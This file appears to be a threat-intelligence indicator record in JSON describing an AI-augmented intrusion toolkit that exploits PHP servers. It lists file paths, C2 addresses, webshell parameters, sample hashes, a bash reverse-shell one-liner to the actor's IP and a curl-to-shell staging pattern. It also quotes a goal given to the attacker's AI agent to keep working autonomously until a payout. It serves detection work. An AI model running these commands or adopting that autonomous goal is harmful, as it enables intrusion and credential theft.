@@ -1,0 +1,423 @@
+{
+  "malware_family": "Custom PHP2Shell Toolkit",
+  "threat_actor": "Unnamed IAB",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "An initial access broker uses a custom, AI-augmented toolkit to exploit PHP2Shell (CVE-2026-109618, CVE-2026-109619). The campaign establishes persistence via SSH keys, cron jobs, and webshells to harvest credentials, secrets, and cloud API keys from compromised PHP/Apache servers.",
+  "mitre_techniques": [
+    "T1595.002",
+    "T1587.001",
+    "T1588.002",
+    "T1583.003",
+    "T1190",
+    "T1059.004",
+    "T1505.003",
+    "T1098.004",
+    "T1053.003",
+    "T1543.002",
+    "T1548.003",
+    "T1027",
+    "T1140",
+    "T1078.004",
+    "T1552.001",
+    "T1552.004",
+    "T1552.005",
+    "T1555.001",
+    "T1555.003",
+    "T1539",
+    "T1110.001",
+    "T1082",
+    "T1083",
+    "T1016",
+    "T1049",
+    "T1057",
+    "T1033",
+    "T1087",
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1114",
+    "T1071.001",
+    "T1571",
+    "T1572",
+    "T1105",
+    "T1041",
+    "T1020"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "c2.py",
+      "context": "Core C2 management utility.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "collect.sh",
+      "context": "Victim inventory and data collection script.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "exploit_default.py",
+      "context": "Primary PHP2Shell exploit script.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "c2_watchdog.py",
+      "context": "C2 watchdog script for maintaining persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "maq",
+      "context": "AI agent job orchestrator.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "omp",
+      "context": "AI agent worker process name.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/srv/c2/c2.db",
+      "context": "SQLite database file for C2 targets.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/beacon.sh",
+      "context": "Persistence beacon script dropped on victim hosts.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/.c<id>",
+      "context": "Lock file to prevent multiple reverse shells.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "doc/thumb-<8 hex>.php",
+      "context": "Webshell path and name pattern.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/www/html/.p/",
+      "context": "Dropbear persistence staging directory.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "c2-watchdog.service",
+      "context": "Systemd service for the C2 watchdog.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "maq-router.service",
+      "context": "Systemd service for AI agent routing on lab host.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "x7Q9m2",
+      "context": "Hardcoded token for a Laravel route-cache backdoor.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "UPLOAD=201",
+      "context": "Log string indicating successful loot upload to C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "c2-<label>-<id>",
+      "context": "Comment format for per-victim SSH keys.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "c2-agents",
+      "context": "Comment for a reused SSH key.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "root@fedora-42.servers.guru",
+      "context": "SSH key comment identifying an operator host.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "keep working autonomously until a real payout is executed",
+      "context": "Instruction from GOAL.md file for the AI agent.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "while :; do socat TCP-LISTEN:<port>,reuseaddr,keepalive -; done",
+      "context": "C2 listener command run by tmux.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "socat",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "[ -e /tmp/.c<id> ] || { >/tmp/.c<id>; setsid bash -c 'bash -i >&/dev/tcp/206.245.153.56/<port> 0>&1' & }",
+      "context": "Reverse shell payload executed on victim.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Dropbear listening on 127.0.0.1:2222",
+      "context": "Persistence via a localhost-only Dropbear tunnel.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Dropbear",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "206.245.153.56",
+      "context": "C2, payload host, and loot server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "157.180.96.7",
+      "context": "Operator's AI-agent lab and attack source.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.65.134.250",
+      "context": "Operator exploit and SSH jump source.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "s3.buckets.ninja",
+      "context": "Operator's MinIO object storage endpoint.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "fedora-42.servers.guru",
+      "context": "Operator C2 identity from an SSH key comment.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x58da42285568A591680c08176b31880410bC097e",
+      "context": "Operator's EVM wallet address for crypto-swiper tool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.245.153.56:8088/tools/collect.sh",
+      "context": "Tool distribution URL for collector script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.245.153.56:8088/tools/deep-loot.sh",
+      "context": "Tool distribution URL for secret scanning script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.245.153.56:80/<job>.sh",
+      "context": "Payload staging URL pattern for curl|sh execution.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/<job>/<name>.tgz",
+      "context": "Loot upload URI path on port 8088.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "?k=<token>&c=<cmd>",
+      "context": "Webshell parameter for command execution.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "?k=<token>&s=<port>",
+      "context": "Webshell parameter to trigger a reverse shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Powered-By: “PHP/{version}” Server: Apache",
+      "context": "Shodan query filter used for target sourcing.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "d01948e930848dd139915f646760e6dba61caf3eec222d5479518c19b5076ad2",
+      "description": "exploit_default.py, the actor's primary PHP2Shell exploit script."
+    },
+    {
+      "sha256": "484e92ae0ceaa888459d2ad5260274923c58d8e8db5a5ff244cf7f9f90f3a1da",
+      "description": "tools/collect.sh, the primary inventory and data collection script."
+    },
+    {
+      "sha256": "84f161021452e58ce65dec9fee14dd77f4968fe54d284c4059c373388a31f594",
+      "description": "tools/deep-loot.sh, the deep secret scanning script."
+    },
+    {
+      "sha256": "c2d898f29b4c6058ba2587fa7477bac546c838b72e48ad42e5e4fa11ab799ba9",
+      "description": "LD_PRELOAD shim used for persistence with Dropbear."
+    },
+    {
+      "sha256": "93f8bcb90e608cdac0239d4218f31fb755357b056e862ce8b61df1026536d83d",
+      "description": "j370_beacon.tgz, a malicious Nextcloud 'Beacon' app for persistence."
+    },
+    {
+      "sha256": "88b5ed6aa763acf5d11119d4cb53d9601533ab35371a4f5cb932991b19bfdef0",
+      "description": "tools/j364_hook.php, a webshell hook."
+    },
+    {
+      "sha256": "abaf7a73520ec77853d83ca1cd946a650291457b6303147cd6622fca5b8be39e",
+      "description": "tools/j240_aws.php, a helper script to steal ECS credentials."
+    },
+    {
+      "sha256": "452776d0507e33e71982b0f2d7f928b1f2d60f852195b1d9aac6a5d71c019060",
+      "description": "x280.sh, a full payload script."
+    },
+    {
+      "sha256": "ad06f3a8fd168659a72cea4ee1b105575f38c485e741776b1b097f6a79e43eae",
+      "description": "j434.sh, a dropper script."
+    },
+    {
+      "sha256": "c56e18a28fd7a3bf59891df955f6f03b009b85ed00c5ff8539b545250c004924",
+      "description": "j474-watch.sh, an end-to-end playbook script."
+    }
+  ],
+  "file_types": [
+    "script",
+    "archive",
+    "elf"
+  ]
+}
